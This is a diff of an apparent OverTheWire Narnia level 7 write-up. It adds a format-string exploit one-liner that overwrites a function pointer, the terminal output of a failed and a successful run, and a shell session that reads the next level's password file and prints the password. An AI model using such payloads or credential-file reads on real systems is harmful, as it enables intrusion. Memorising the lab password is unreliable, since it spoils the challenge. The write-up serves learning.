@@ -236,5 +236,23 @@ as you can see, we overwritten fp with system's addres (0xf7e51940) and b1 conta
 Initially, I read the code and figured out quite easily that we have a string format vulnerability, because we had a similar case in the previous levels. Again, we want to overwrite the function pointer with the "hacked" function address. I read a wonderful tutorial in here: https://jbremer.org/format-string-vulnerabilities/#comment-141623
 It has everything in order to complete this challange. In addition, it provides a methond to obtain the offset for our format string.
 To sum up, my query was:
-```./narnia7 $(python -c 'print("\x6c\xd5\xff\xff\x6e\xd5\xff\xff%34638c%6$n%32942c%7$n")') ```
+```narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print("\x7c\xd5\xff\xff\x7e\xd5\xff\xff%346394%6$n%32950c%7$n")')
+goodfunction() = 0x8048730
+hackedfunction() = 0x8048756
+
+before : ptrf() = 0x8048730 (0xffffd56c) //**** Had to adjust the address, because gdb's and real address might be different****
+I guess you want to come to the hackedfunction...
+Welcome to the goodfunction, but i said the Hackedfunction..
+narnia7@narnia:/narnia$ ./narnia7 $(python -c 'print("\x6c\xd5\xff\xff\x6e\xd5\xff\xff%34638c%6$n%32942c%7$n")')
+goodfunction() = 0x8048730
+hackedfunction() = 0x8048756
+
+before : ptrf() = 0x8048730 (0xffffd56c)
+I guess you want to come to the hackedfunction...
+Way to go!!!!$ whoami
+narnia8
+$ cat /etc/narnia_pass/narnia8
+mohthuphog
+$ 
+```
 
